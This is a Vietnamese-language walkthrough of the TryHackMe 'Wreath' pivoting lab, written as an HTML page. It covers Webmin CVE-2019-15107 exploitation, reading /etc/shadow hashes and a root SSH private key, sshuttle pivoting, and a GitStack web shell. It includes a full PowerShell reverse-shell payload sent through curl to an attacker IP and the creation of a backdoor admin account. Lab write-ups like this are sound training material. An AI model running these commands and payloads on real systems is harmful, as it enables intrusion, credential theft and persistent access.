@@ -1,0 +1,853 @@
+
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Wreath - tryhackme</title>
+        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+        <link href="https://cdn.jsdelivr.net/npm/lightgallery.js/dist/css/lightgallery.min.css" rel="stylesheet">
+        <link href="https://cdn.jsdelivr.net/npm/lg-thumbnail.js/dist/lg-thumbnail.min.css" rel="stylesheet">
+        <!-- Add Pygments CSS for code highlighting -->
+        <style>pre { line-height: 125%; }
+td.linenos .normal { color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px; }
+span.linenos { color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px; }
+td.linenos .special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
+span.linenos.special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
+.highlight .hll { background-color: #ffffcc }
+.highlight { background: #f8f8f8; }
+.highlight .c { color: #3D7B7B; font-style: italic } /* Comment */
+.highlight .err { border: 1px solid #FF0000 } /* Error */
+.highlight .k { color: #008000; font-weight: bold } /* Keyword */
+.highlight .o { color: #666666 } /* Operator */
+.highlight .ch { color: #3D7B7B; font-style: italic } /* Comment.Hashbang */
+.highlight .cm { color: #3D7B7B; font-style: italic } /* Comment.Multiline */
+.highlight .cp { color: #9C6500 } /* Comment.Preproc */
+.highlight .cpf { color: #3D7B7B; font-style: italic } /* Comment.PreprocFile */
+.highlight .c1 { color: #3D7B7B; font-style: italic } /* Comment.Single */
+.highlight .cs { color: #3D7B7B; font-style: italic } /* Comment.Special */
+.highlight .gd { color: #A00000 } /* Generic.Deleted */
+.highlight .ge { font-style: italic } /* Generic.Emph */
+.highlight .gr { color: #E40000 } /* Generic.Error */
+.highlight .gh { color: #000080; font-weight: bold } /* Generic.Heading */
+.highlight .gi { color: #008400 } /* Generic.Inserted */
+.highlight .go { color: #717171 } /* Generic.Output */
+.highlight .gp { color: #000080; font-weight: bold } /* Generic.Prompt */
+.highlight .gs { font-weight: bold } /* Generic.Strong */
+.highlight .gu { color: #800080; font-weight: bold } /* Generic.Subheading */
+.highlight .gt { color: #0044DD } /* Generic.Traceback */
+.highlight .kc { color: #008000; font-weight: bold } /* Keyword.Constant */
+.highlight .kd { color: #008000; font-weight: bold } /* Keyword.Declaration */
+.highlight .kn { color: #008000; font-weight: bold } /* Keyword.Namespace */
+.highlight .kp { color: #008000 } /* Keyword.Pseudo */
+.highlight .kr { color: #008000; font-weight: bold } /* Keyword.Reserved */
+.highlight .kt { color: #B00040 } /* Keyword.Type */
+.highlight .m { color: #666666 } /* Literal.Number */
+.highlight .s { color: #BA2121 } /* Literal.String */
+.highlight .na { color: #687822 } /* Name.Attribute */
+.highlight .nb { color: #008000 } /* Name.Builtin */
+.highlight .nc { color: #0000FF; font-weight: bold } /* Name.Class */
+.highlight .no { color: #880000 } /* Name.Constant */
+.highlight .nd { color: #AA22FF } /* Name.Decorator */
+.highlight .ni { color: #717171; font-weight: bold } /* Name.Entity */
+.highlight .ne { color: #CB3F38; font-weight: bold } /* Name.Exception */
+.highlight .nf { color: #0000FF } /* Name.Function */
+.highlight .nl { color: #767600 } /* Name.Label */
+.highlight .nn { color: #0000FF; font-weight: bold } /* Name.Namespace */
+.highlight .nt { color: #008000; font-weight: bold } /* Name.Tag */
+.highlight .nv { color: #19177C } /* Name.Variable */
+.highlight .ow { color: #AA22FF; font-weight: bold } /* Operator.Word */
+.highlight .w { color: #bbbbbb } /* Text.Whitespace */
+.highlight .mb { color: #666666 } /* Literal.Number.Bin */
+.highlight .mf { color: #666666 } /* Literal.Number.Float */
+.highlight .mh { color: #666666 } /* Literal.Number.Hex */
+.highlight .mi { color: #666666 } /* Literal.Number.Integer */
+.highlight .mo { color: #666666 } /* Literal.Number.Oct */
+.highlight .sa { color: #BA2121 } /* Literal.String.Affix */
+.highlight .sb { color: #BA2121 } /* Literal.String.Backtick */
+.highlight .sc { color: #BA2121 } /* Literal.String.Char */
+.highlight .dl { color: #BA2121 } /* Literal.String.Delimiter */
+.highlight .sd { color: #BA2121; font-style: italic } /* Literal.String.Doc */
+.highlight .s2 { color: #BA2121 } /* Literal.String.Double */
+.highlight .se { color: #AA5D1F; font-weight: bold } /* Literal.String.Escape */
+.highlight .sh { color: #BA2121 } /* Literal.String.Heredoc */
+.highlight .si { color: #A45A77; font-weight: bold } /* Literal.String.Interpol */
+.highlight .sx { color: #008000 } /* Literal.String.Other */
+.highlight .sr { color: #A45A77 } /* Literal.String.Regex */
+.highlight .s1 { color: #BA2121 } /* Literal.String.Single */
+.highlight .ss { color: #19177C } /* Literal.String.Symbol */
+.highlight .bp { color: #008000 } /* Name.Builtin.Pseudo */
+.highlight .fm { color: #0000FF } /* Name.Function.Magic */
+.highlight .vc { color: #19177C } /* Name.Variable.Class */
+.highlight .vg { color: #19177C } /* Name.Variable.Global */
+.highlight .vi { color: #19177C } /* Name.Variable.Instance */
+.highlight .vm { color: #19177C } /* Name.Variable.Magic */
+.highlight .il { color: #666666 } /* Literal.Number.Integer.Long */</style>
+        <style>
+            /* Center the HTML file on the screen */
+            body {
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                height: 100vh;
+                padding-top: 30px;
+            }
+            /* Make the display width of the HTML file smaller */
+            .container {
+                max-width: 42vw;
+                margin: 0 auto;
+                height: 100%
+            }
+            
+            img {
+                width: 80%;
+            }
+        </style>
+        <script src="https://cdn.jsdelivr.net/npm/lightgallery.js/dist/js/lightgallery.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lg-thumbnail.js/dist/lg-thumbnail.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lg-zoom.js/dist/lg-zoom.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lg-fullscreen.js/dist/lg-fullscreen.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lg-share.js/dist/lg-share.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lg-autoplay.js/dist/lg-autoplay.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lg-rotate.js/dist/lg-rotate.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lg-flip.js/dist/lg-flip.min.js"></script>
+        <script>
+            window.onload = function() {
+                const images = document.getElementsByTagName('img');
+                const lightGalleryItems = [];
+                for (let i = 0; i < images.length; i++) {
+                    const img = images[i];
+                    if (img.naturalWidth > 1000) {
+                        if (window.innerWidth > 768) {
+                            img.style.width = '110%';
+                            img.style.transform = 'translateX(-4%)';
+                        } else {
+                            img.style.width = '100%';
+                            img.style.transform = 'none';
+                        }
+                    }
+                    lightGalleryItems.push({ src: img.src, thumb: img.src });
+                    img.setAttribute('data-lg-idx', i);
+                    img.addEventListener('click', function() {
+                        lightGallery(img, {
+                            dynamic: true,
+                            dynamicEl: lightGalleryItems,
+                            index: parseInt(img.getAttribute('data-lg-idx'))
+                        });
+                    });
+                }
+            };
+        </script>
+    </head>
+    <body>
+        <div class="container">
+            <div class="row">
+                <div class="col">
+                    <h1 style="text-align:center; text-transform:uppercase; font-family: 'Playfair Display', serif; font-weight:700;"">Wreath - Pivoting</h1>
+
+<p>ENUM:</p>
+<p>Scan với nmap: nmap -A -sC -sV -T4 -p 1-15000 10.200.81.200 -Pn</p>
+<p>OUTPUT:</p>
+<p>Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-08 00:04 EDT</p>
+<p>Stats: 0:01:10 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan</p>
+<p>Connect Scan Timing: About 44.01% done; ETC: 00:07 (0:01:30 remaining)</p>
+<p>Stats: 0:01:12 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan</p>
+<p>Connect Scan Timing: About 45.17% done; ETC: 00:07 (0:01:27 remaining)</p>
+<p>Nmap scan report for thomaswreath.thm (10.200.81.200)</p>
+<p>Host is up (0.36s latency).</p>
+<p>Not shown: 14867 filtered tcp ports (no-response), 128 filtered tcp ports (host-unreach)</p>
+<p>PORT      STATE  SERVICE    VERSION</p>
+<p>22/tcp    open   ssh        OpenSSH 8.0 (protocol 2.0)</p>
+<p>| ssh-hostkey:</p>
+<p>|   3072 9c:1b:d4:b4:05:4d:88:99:ce:09:1f:c1:15:6a:d4:7e (RSA)</p>
+<p>|   256 93:55:b4:d9:8b:70:ae:8e:95:0d:c2:b6:d2:03:89:a4 (ECDSA)</p>
+<p>|_  256 f0:61:5a:55:34:9b:b7:b8:3a:46:ca:7d:9f:dc:fa:12 (ED25519)</p>
+<p>80/tcp    open   http       Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)</p>
+<p>|_http-title: Did not follow redirect to https://thomaswreath.thm</p>
+<p>|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c</p>
+<p>443/tcp   open   ssl/http   Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)</p>
+<p>|_http-title: Thomas Wreath | Developer</p>
+<p>| http-methods:</p>
+<p>|_  Potentially risky methods: TRACE</p>
+<p>| ssl-cert: Subject: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB</p>
+<p>| Not valid before: 2022-06-08T03:59:08</p>
+<p>|_Not valid after:  2023-06-08T03:59:08</p>
+<p>|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c</p>
+<p>|_ssl-date: TLS randomness does not represent time</p>
+<p>| tls-alpn:</p>
+<p>|_  http/1.1</p>
+<p>9090/tcp  closed zeus-admin</p>
+<p>10000/tcp open   http       MiniServ 1.890 (Webmin httpd)</p>
+<p>|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).</p>
+<p>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</p>
+<p>Nmap done: 1 IP address (1 host up) scanned in 182.50 seconds</p>
+<p>máy chạy centos</p>
+<p>Port 10k có CVE-2019-15107</p>
+<p>EXPLOIT WEB SERVER</p>
+<p>Tải file exploit cve:</p>
+<p>git clone</p>
+<p>sudo apt install python3-pip</p>
+<p>cd CVE-2019-15107 &amp;&amp; pip3 install -r requirements.txt</p>
+<p>chmod +x ./CVE-2019-15107.py</p>
+<p>Khai thác:</p>
+<p>./CVE-2019-15107.py 10.200.81.200</p>
+<p>Sau khi chiếm quyền thành công thì tiến hành tìm kiếm thêm thông tin.</p>
+<h1>whoami</h1>
+<p>root</p>
+<h1>cat /etc/passwd</h1>
+<p>root:x:0:0:root:/root:/bin/bash</p>
+<p>bin:x:1:1:bin:/bin:/sbin/nologin</p>
+<p>daemon:x:2:2:daemon:/sbin:/sbin/nologin</p>
+<p>adm:x:3:4:adm:/var/adm:/sbin/nologin</p>
+<p>lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</p>
+<p>sync:x:5:0:sync:/sbin:/bin/sync</p>
+<p>shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</p>
+<p>halt:x:7:0:halt:/sbin:/sbin/halt</p>
+<p>mail:x:8:12:mail:/var/spool/mail:/sbin/nologin</p>
+<p>operator:x:11:0:operator:/root:/sbin/nologin</p>
+<p>games:x:12:100:games:/usr/games:/sbin/nologin</p>
+<p>ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin</p>
+<p>nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin</p>
+<p>dbus:x:81:81:System message bus:/:/sbin/nologin</p>
+<p>systemd-coredump:x:999:997:systemd Core Dumper:/:/sbin/nologin</p>
+<p>systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin</p>
+<p>tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin</p>
+<p>polkitd:x:998:996:User for polkitd:/:/sbin/nologin</p>
+<p>libstoragemgmt:x:997:995:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin</p>
+<p>cockpit-ws:x:996:993:User for cockpit web service:/nonexisting:/sbin/nologin</p>
+<p>cockpit-wsinstance:x:995:992:User for cockpit-ws instances:/nonexisting:/sbin/nologin</p>
+<p>sssd:x:994:990:User for sssd:/:/sbin/nologin</p>
+<p>sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin</p>
+<p>chrony:x:993:989::/var/lib/chrony:/sbin/nologin</p>
+<p>rngd:x:992:988:Random Number Generator Daemon:/var/lib/rngd:/sbin/nologin</p>
+<p>twreath:x:1000:1000:Thomas Wreath:/home/twreath:/bin/bash</p>
+<p>unbound:x:991:987:Unbound DNS resolver:/etc/unbound:/sbin/nologin</p>
+<p>apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin</p>
+<p>nginx:x:990:986:Nginx web server:/var/lib/nginx:/sbin/nologin</p>
+<p>mysql:x:27:27:MySQL Server:/var/lib/mysql:/sbin/nologin</p>
+<h1>cat /etc/shadow</h1>
+<p>root:$6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1::0:99999:7:::</p>
+<p>bin:*:18358:0:99999:7:::</p>
+<p>daemon:*:18358:0:99999:7:::</p>
+<p>adm:*:18358:0:99999:7:::</p>
+<p>lp:*:18358:0:99999:7:::</p>
+<p>sync:*:18358:0:99999:7:::</p>
+<p>shutdown:*:18358:0:99999:7:::</p>
+<p>halt:*:18358:0:99999:7:::</p>
+<p>mail:*:18358:0:99999:7:::</p>
+<p>operator:*:18358:0:99999:7:::</p>
+<p>games:*:18358:0:99999:7:::</p>
+<p>ftp:*:18358:0:99999:7:::</p>
+<p>nobody:*:18358:0:99999:7:::</p>
+<p>dbus:!!:18573::::::</p>
+<p>systemd-coredump:!!:18573::::::</p>
+<p>systemd-resolve:!!:18573::::::</p>
+<p>tss:!!:18573::::::</p>
+<p>polkitd:!!:18573::::::</p>
+<p>libstoragemgmt:!!:18573::::::</p>
+<p>cockpit-ws:!!:18573::::::</p>
+<p>cockpit-wsinstance:!!:18573::::::</p>
+<p>sssd:!!:18573::::::</p>
+<p>sshd:!!:18573::::::</p>
+<p>chrony:!!:18573::::::</p>
+<p>rngd:!!:18573::::::</p>
+<p>twreath:$6$0my5n311RD7EiK3J$zVFV3WAPCm/dBxzz0a7uDwbQenLohKiunjlDonkqx1huhjmFYZe0RmCPsHmW3OnWYwf8RWPdXAdbtYpkJCReg.::0:99999:7:::</p>
+<p>unbound:!!:18573::::::</p>
+<p>apache:!!:18573::::::</p>
+<p>nginx:!!:18573::::::</p>
+<p>mysql:!!:18573::::::</p>
+<h1>cat /root/.ssh/id_rsa</h1>
+<p>-----BEGIN OPENSSH PRIVATE KEY-----</p>
+<p>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</p>
+<p>NhAAAAAwEAAQAAAYEAs0oHYlnFUHTlbuhePTNoITku4OBH8OxzRN8O3tMrpHqNH3LHaQRE</p>
+<p>LgAe9qk9dvQA7pJb9V6vfLc+Vm6XLC1JY9Ljou89Cd4AcTJ9OruYZXTDnX0hW1vO5Do1bS</p>
+<p>jkDDIfoprO37/YkDKxPFqdIYW0UkzA60qzkMHy7n3kLhab7gkV65wHdIwI/v8+SKXlVeeg</p>
+<p>0+L12BkcSYzVyVUfE6dYxx3BwJSu8PIzLO/XUXXsOGuRRno0dG3XSFdbyiehGQlRIGEMzx</p>
+<p>hdhWQRry2HlMe7A5dmW/4ag8o+NOhBqygPlrxFKdQMg6rLf8yoraW4mbY7rA7/TiWBi6jR</p>
+<p>fqFzgeL6W0hRAvvQzsPctAK+ZGyGYWXa4qR4VIEWnYnUHjAosPSLn+o8Q6qtNeZUMeVwzK</p>
+<p>H9rjFG3tnjfZYvHO66dypaRAF4GfchQusibhJE+vlKnKNpZ3CtgQsdka6oOdu++c1M++Zj</p>
+<p>z14DJom9/CWDpvnSjRRVTU1Q7w/1MniSHZMjczIrAAAFiMfOUcXHzlHFAAAAB3NzaC1yc2</p>
+<p>EAAAGBALNKB2JZxVB05W7oXj0zaCE5LuDgR/Dsc0TfDt7TK6R6jR9yx2kERC4AHvapPXb0</p>
+<p>AO6SW/Ver3y3PlZulywtSWPS46LvPQneAHEyfTq7mGV0w519IVtbzuQ6NW0o5AwyH6Kazt</p>
+<p>+/2JAysTxanSGFtFJMwOtKs5DB8u595C4Wm+4JFeucB3SMCP7/Pkil5VXnoNPi9dgZHEmM</p>
+<p>1clVHxOnWMcdwcCUrvDyMyzv11F17DhrkUZ6NHRt10hXW8onoRkJUSBhDM8YXYVkEa8th5</p>
+<p>THuwOXZlv+GoPKPjToQasoD5a8RSnUDIOqy3/MqK2luJm2O6wO/04lgYuo0X6hc4Hi+ltI</p>
+<p>UQL70M7D3LQCvmRshmFl2uKkeFSBFp2J1B4wKLD0i5/qPEOqrTXmVDHlcMyh/a4xRt7Z43</p>
+<p>2WLxzuuncqWkQBeBn3IULrIm4SRPr5SpyjaWdwrYELHZGuqDnbvvnNTPvmY89eAyaJvfwl</p>
+<p>g6b50o0UVU1NUO8P9TJ4kh2TI3MyKwAAAAMBAAEAAAGAcLPPcn617z6cXxyI6PXgtknI8y</p>
+<p>lpb8RjLV7+bQnXvFwhTCyNt7Er3rLKxAldDuKRl2a/kb3EmKRj9lcshmOtZ6fQ2sKC3yoD</p>
+<p>oyS23e3A/b3pnZ1kE5bhtkv0+7qhqBz2D/Q6qSJi0zpaeXMIpWL0GGwRNZdOy2dv+4V9o4</p>
+<p>8o0/g4JFR/xz6kBQ+UKnzGbjrduXRJUF9wjbePSDFPCL7AquJEwnd0hRfrHYtjEd0L8eeE</p>
+<p>egYl5S6LDvmDRM+mkCNvI499+evGwsgh641MlKkJwfV6/iOxBQnGyB9vhGVAKYXbIPjrbJ</p>
+<p>r7Rg3UXvwQF1KYBcjaPh1o9fQoQlsNlcLLYTp1gJAzEXK5bC5jrMdrU85BY5UP+wEUYMbz</p>
+<p>TNY0be3g7bzoorxjmeM5ujvLkq7IhmpZ9nVXYDSD29+t2JU565CrV4M69qvA9L6ktyta51</p>
+<p>bA4Rr/l9f+dfnZMrKuOqpyrfXSSZwnKXz22PLBuXiTxvCRuZBbZAgmwqttph9lsKp5AAAA</p>
+<p>wBMyQsq6e7CHlzMFIeeG254QptEXOAJ6igQ4deCgGzTfwhDSm9j7bYczVi1P1+BLH1pDCQ</p>
+<p>viAX2kbC4VLQ9PNfiTX+L0vfzETRJbyREI649nuQr70u/9AedZMSuvXOReWlLcPSMR9Hn7</p>
+<p>bA70kEokZcE9GvviEHL3Um6tMF9LflbjzNzgxxwXd5g1dil8DTBmWuSBuRTb8VPv14SbbW</p>
+<p>HHVCpSU0M82eSOy1tYy1RbOsh9hzg7hOCqc3gqB+sx8bNWOgAAAMEA1pMhxKkqJXXIRZV6</p>
+<p>0w9EAU9a94dM/6srBObt3/7Rqkr9sbMOQ3IeSZp59KyHRbZQ1mBZYo+PKVKPE02DBM3yBZ</p>
+<p>r2u7j326Y4IntQn3pB3nQQMt91jzbSd51sxitnqQQM8cR8le4UPNA0FN9JbssWGxpQKnnv</p>
+<p>m9kI975gZ/vbG0PZ7WvIs2sUrKg++iBZQmYVs+bj5Tf0CyHO7EST414J2I54t9vlDerAcZ</p>
+<p>DZwEYbkM7/kXMgDKMIp2cdBMP+VypVAAAAwQDV5v0L5wWZPlzgd54vK8BfN5o5gIuhWOkB</p>
+<p>2I2RDhVCoyyFH0T4Oqp1asVrpjwWpOd+0rVDT8I6rzS5/VJ8OOYuoQzumEME9rzNyBSiTw</p>
+<p>YlXRN11U6IKYQMTQgXDcZxTx+KFp8WlHV9NE2g3tHwagVTgIzmNA7EPdENzuxsXFwFH9TY</p>
+<p>EsDTnTZceDBI6uBFoTQ1nIMnoyAxOSUC+Rb1TBBSwns/r4AJuA/d+cSp5U0jbfoR0R/8by</p>
+<p>GbJ7oAQ232an8AAAARcm9vdEB0bS1wcm9kLXNlcnYBAg==</p>
+<p>-----END OPENSSH PRIVATE KEY-----</p>
+<p>Có user, có key rồi thì ssh vào server thôi:</p>
+<p>ssh -i id_wr</p>
+<p>Git enum</p>
+<p>Download nmap binary to your computer</p>
+<p>create server</p>
+<p>python3 -m http.server 80</p>
+<p>Access into target host:</p>
+<p>use curl to download file</p>
+<p>curl 10.50.85.26/nmap -o ./nmap-dai</p>
+<p>Run scan</p>
+<p>./nmap-dai -sn 10.200.84.0/24 -oN scan-dai</p>
+<p>Host is up (-0.18s latency).</p>
+<p>MAC Address: 02:F3:70:5F:3A:E7 (Unknown)</p>
+<p>Nmap scan report for ip-10-200-84-100.eu-west-1.compute.internal (10.200.84.100)</p>
+<p>Host is up (0.00019s latency).</p>
+<p>MAC Address: 02:EF:0B:41:F6:17 (Unknown)</p>
+<p>Nmap scan report for ip-10-200-84-150.eu-west-1.compute.internal (10.200.84.150)</p>
+<p>Host is up (0.00015s latency).</p>
+<p>MAC Address: 02:A2:EE:BA:7D:4B (Unknown)</p>
+<p>Nmap scan report for ip-10-200-84-250.eu-west-1.compute.internal (10.200.84.250)</p>
+<p>Host is up (0.00022s latency).</p>
+<p>MAC Address: 02:9C:9D:AF:36:F5 (Unknown)</p>
+<p>Nmap scan report for ip-10-200-84-200.eu-west-1.compute.internal (10.200.84.200)</p>
+<p>Host is up.</p>
+<p>./nmap-dai 10.200.84.100,150 -oN scan-dai1</p>
+<p>Nmap scan report for ip-10-200-84-150.eu-west-1.compute.internal (10.200.84.150)</p>
+<p>Host is up (0.00051s latency).</p>
+<p>Not shown: 6147 filtered ports</p>
+<p>PORT     STATE SERVICE</p>
+<p>80/tcp   open  http</p>
+<p>3389/tcp open  ms-wbt-server</p>
+<p>5985/tcp open  wsman</p>
+<p>MAC Address: 02:A2:EE:BA:7D:4B (Unknown)</p>
+<p>PIVOTING</p>
+<p>curl 10.200.84.150</p>
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+
+<meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+<title>Page not found at /</title>
+
+<meta name="robots" content="NONE,NOARCHIVE">
+
+<style type="text/css">
+
+html * { padding:0; margin:0; }
+
+body * { padding:10px 20px; }
+
+body * * { padding:0; }
+
+body { font:small sans-serif; background:#eee; }
+
+body>div { border-bottom:1px solid #ddd; }
+
+h1 { font-weight:normal; margin-bottom:.4em; }
+
+h1 span { font-size:60%; color:#666; font-weight:normal; }
+
+table { border:none; border-collapse: collapse; width:100%; }
+
+td, th { vertical-align:top; padding:2px 3px; }
+
+th { width:12em; text-align:right; color:#666; padding-right:.5em; }
+
+#info { background:#f6f6f6; }
+
+#info ol { margin: 0.5em 4em; }
+
+#info ol li { font-family: monospace; }
+
+#summary { background: #ffc; }
+
+#explanation { background:#eee; border-bottom: 0px none; }
+
+</style>
+
+</head>
+
+<body>
+
+<div id="summary">
+
+<h1>Page not found <span>(404)</span></h1>
+
+<table class="meta">
+
+<tr>
+
+<th>Request Method:</th>
+
+<td>GET</td>
+
+</tr>
+
+<tr>
+
+<th>Request URL:</th>
+
+<td>http://10.200.84.150/</td>
+
+</tr>
+
+</table>
+
+</div>
+
+<div id="info">
+
+<p>
+
+Using the URLconf defined in <code>app.urls</code>,
+
+Django tried these URL patterns, in this order:
+
+</p>
+
+<ol>
+
+<li>
+
+^registration/login/$
+
+</li>
+
+<li>
+
+^gitstack/
+
+</li>
+
+<li>
+
+^rest/
+
+</li>
+
+</ol>
+
+<p>The current URL, <code></code>, didn't match any of these.</p>
+
+</div>
+
+<div id="explanation">
+
+<p>
+
+You're seeing this error because you have <code>DEBUG = True</code> in
+
+your Django settings file. Change that to <code>False</code>, and Django
+
+will display a standard 404 page.
+
+</p>
+
+</div>
+
+</body>
+
+</html>
+
+<p>Pivoting với sshuttle:</p>
+<p>sshuttle -r  --ssh-cmd "ssh -i id_wr" 10.200.84.0/24 -x 10.200.84.200</p>
+<p>To flush DNS cache in Debian GNU/Linux use command:</p>
+<p>sudo systemd-resolve --flush-caches</p>
+<p>If you get error message: “Failed to flush caches: Unit dbus-org.freedesktop.resolve1.service not found.“, enable the service on your system:</p>
+<p>sudo systemctl enable systemd-resolved.service</p>
+<p>Then again run the “systemd-resolve –flush-caches” command.</p>
+<p>You can then check the statistics in order to make sure that your cache size is now zero, thus cleared. Run the following command in order to view the statistics:</p>
+<p>sudo systemd-resolve --statistics</p>
+<p>sshuttle pivot qua lỗ hổng ssh và tạo nên kết nối tương tự vpn</p>
+<p>Điều này có thể xảy ra khi máy bị xâm nhập mà bạn đang kết nối là một phần của mạng con mà bạn đang cố gắng lấy quyền truy cập. Ví dụ: nếu chúng tôi đang kết nối với 172.16.0.5 và cố chuyển tiếp 172.16.0.0/24, thì chúng tôi sẽ đưa máy chủ bị xâm nhập vào bên trong mạng con mới được chuyển tiếp, do đó làm gián đoạn kết nối và khiến công cụ chết.</p>
+<p>Để giải quyết vấn đề này, chúng tôi yêu cầu sshuttle loại trừ máy chủ bị xâm phạm khỏi phạm vi mạng con bằng cách sử dụng công -xtắc.</p>
+<p>Để sử dụng ví dụ trước đó của chúng tôi:
+sshuttle -r  172.16.0.0/24 -x 172.16.0.5</p>
+<p>Điều này sẽ cho phép sshuttle tạo kết nối mà không làm gián đoạn chính nó.</p>
+<p>Truy cập được vào IP của host khác.</p>
+<p><img alt="" src="../media/Wreath%20-%20tryhackme_1.png" /></p>
+<p>dùng searchsploit để tìm cve.</p>
+<p>Thay đổi ip, port để tấn công. Ở cuối file sẽ có đường dẫn được bôi đậm như hình. Thay đổi thành tên bất kỳ nếu muốn</p>
+<p><img alt="" src="../media/Wreath%20-%20tryhackme_2.png" /></p>
+<p>Chạy file để tấn công vào git server</p>
+<p><img alt="" src="../media/Wreath%20-%20tryhackme_3.png" /></p>
+<p>Ở đây đã chiếm được quyền cao nhất của máy. Với quyền này có thể xác nhận máy này là windows. Ở đây xuất hiện vấn đề là script chạy xong câu lệnh thì phải edit lại code để chạy lệnh khác, như vậy khá phức tạp.</p>
+<p>Ta sử dụng cách khác là dùng curl để post command lên server. url chính là đường dẫn file shell tấn công từ file py lúc nãy.</p>
+<p>curl -X POST  -d "a=COMMAND"</p>
+<p>Cách khác là dùng burpsuite</p>
+<p><img alt="" src="../media/Wreath%20-%20tryhackme_4.png" /></p>
+<p>capture url và send to repeater, sau đó thêm phần</p>
+<p>Content-Type: application/x-www-form-urlencoded
+a=<command></p>
+<p>Nhấn send để nhận phản hồi</p>
+<p><img alt="" src="../media/Wreath%20-%20tryhackme_5.png" /></p>
+<p>Sau đó truy cập lại firewall server có ip .200 dùng curl để down bin của nc về:</p>
+<p>curl http://10.50.85.26:8000/nc -o ./nc-dai</p>
+<p>chmod +x nc-dai</p>
+<p><img alt="" src="../media/Wreath%20-%20tryhackme_6.png" /></p>
+<p><img alt="" src="../media/Wreath%20-%20tryhackme_7.png" /></p>
+<p>Trên server firewall, ta add thêm 1 port mới để tạo reverse shell:</p>
+<p>firewall-cmd --zone=public --add-port PORT/tcp</p>
+<p>và dùng nc để lắng nghe port vừa tạo</p>
+<p>./nc -nlvp 15426</p>
+<p><img alt="" src="../media/Wreath%20-%20tryhackme_8.png" /></p>
+<p>Trở lại git server dùng payload sau để tạo reverse shell:</p>
+<p>powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</p>
+<p>nhấn ctrl+u ở payload để encode payload nếu dùng burpsuite</p>
+<p><img alt="" src="../media/Wreath%20-%20tryhackme_9.png" /></p>
+<p>Nếu dùng curl thì dùng command sau:</p>
+<p>curl -X POST http://10.200.84.150/web/exploit-dai.php -d "a=powershell.exe%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.200.84.200%27%2C15426%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22"</p>
+<p><img alt="" src="../media/Wreath%20-%20tryhackme_10.png" /></p>
+<p><img alt="" src="../media/Wreath%20-%20tryhackme_11.png" /></p>
+<p>Kết quả là chiếm thêm được 1 server</p>
+<p>Trên git server tạo tk mới và add vào group admin, rdp</p>
+<p>net user dai1 nodai1 /add</p>
+<p>net localgroup Administrators dai1 /add</p>
+<p>net localgroup "Remote Management Users" dai1 /add</p>
